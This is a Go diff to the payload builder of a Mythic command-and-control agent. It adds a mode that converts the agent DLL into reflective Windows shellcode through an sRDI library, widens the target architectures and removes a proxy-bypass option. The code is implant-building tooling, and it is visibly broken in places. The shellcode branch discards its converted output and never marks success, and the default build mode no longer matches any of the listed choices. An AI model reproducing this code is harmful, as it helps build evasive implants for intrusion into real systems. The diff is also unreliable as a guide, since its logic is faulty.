@@ -9,6 +9,7 @@ import (
 	"path/filepath"
 	"strings"
 
+	"github.com/MythicAgents/merlin/Payload_Type/merlin/container/pkg/srdi"
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
@@ -28,26 +29,19 @@ var payloadDefinition = agentstructs.PayloadType{
 	BuildParameters: []agentstructs.BuildParameter{
 		{
 			Name:          "mode",
-			Description:   "Choose the build mode option. Select default for executables, c-shared for a .dylib or .so file, or c-archive for a .Zip containing C source code with an archive and header file",
+			Description:   "Choose the build mode option. Select default for executables, shared for a .dll or .so file,  shellcode to use sRDI to convert the DLL to windows shellcode",
 			Required:      false,
 			DefaultValue:  "default",
-			Choices:       []string{"default", "c-archive", "c-shared"},
+			Choices:       []string{"default-executable", "shared", "windows-shellcode"},
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
 		},
 		{
 			Name:          "architecture",
 			Description:   "Choose the agent's architecture",
 			Required:      false,
-			DefaultValue:  "AMD_x64",
-			Choices:       []string{"AMD_x64", "ARM_x64"},
+			DefaultValue:  "amd64",
+			Choices:       []string{"amd64", "386", "arm", "arm64", "mips", "mips64"},
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
-		},
-		{
-			Name:          "proxy_bypass",
-			Description:   "Ignore HTTP proxy environment settings configured on the target host?",
-			Required:      false,
-			DefaultValue:  false,
-			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
 			Name:          "garble",
@@ -56,13 +50,6 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
-		// {
-		// 	Name:          "supportFiles",
-		// 	Description:   "Uploading multiple support files.",
-		// 	Required:      false,
-		// 	DefaultValue:  false,
-		// 	ParameterType: agentstructs.BUILD_PARAMETER_TYPE_FILE_MULTIPLE,
-		// },
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -144,12 +131,6 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			ldflags += fmt.Sprintf(" -X '%s.%s=%v'", poseidon_repo_profile, key, val)
 		}
 	}
-	proxyBypass, err := payloadBuildMsg.BuildParameters.GetBooleanArg("proxy_bypass")
-	if err != nil {
-		payloadBuildResponse.Success = false
-		payloadBuildResponse.BuildStdErr = err.Error()
-		return payloadBuildResponse
-	}
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
 	if err != nil {
 		payloadBuildResponse.Success = false
@@ -168,12 +149,12 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		payloadBuildResponse.BuildStdErr = err.Error()
 		return payloadBuildResponse
 	}
-	ldflags += fmt.Sprintf(" -X '%s.proxy_bypass=%v'", poseidon_repo_profile, proxyBypass)
+	//ldflags += fmt.Sprintf(" -X '%s.proxy_bypass=%v'", poseidon_repo_profile, proxyBypass)
 	ldflags += " -buildid="
-	goarch := "amd64"
-	if architecture == "ARM_x64" {
-		goarch = "arm64"
-	}
+	goarch := architecture // "amd64"
+	// if architecture == "ARM_x64" {
+	// 	goarch = "arm64"
+	// }
 	tags := payloadBuildMsg.C2Profiles[0].Name
 	command := fmt.Sprintf("rm -rf /deps; CGO_ENABLED=1 GOOS=%s GOARCH=%s ", targetOs, goarch)
 	goCmd := fmt.Sprintf("-tags %s -buildmode %s -ldflags \"%s\"", tags, mode, ldflags)
@@ -200,7 +181,8 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	command += fmt.Sprintf("-%s", goarch)
 	payloadName += fmt.Sprintf("-%s", goarch)
-	if mode == "c-shared" {
+	//"default-executable", "shared", "windows-shellcode"
+	if mode == "shared" {
 		if targetOs == "windows" {
 			command += ".dll"
 			payloadName += ".dll"
@@ -211,9 +193,11 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			command += ".so"
 			payloadName += ".so"
 		}
-	} else if mode == "c-archive" {
-		command += ".a"
-		payloadName += ".a"
+	} else if mode == "windows-shellcode" {
+		command += ".dll"
+		payloadName += ".dll"
+		// need a DLL for the dll to shellcode conversion later
+		// TODO - merlin sRDI for dll to shellcode option
 	}
 
 	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
@@ -262,6 +246,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
 		payloadBuildResponse.Success = false
 		payloadBuildResponse.BuildMessage = "Failed to find final payload"
+	} else if mode == "windows-shellcode" {
+		payloadBytes = srdi.DLLToReflectiveShellcode(payloadBytes, "Run", true, "")
+
 	} else {
 		payloadBuildResponse.Payload = &payloadBytes
 		payloadBuildResponse.Success = true
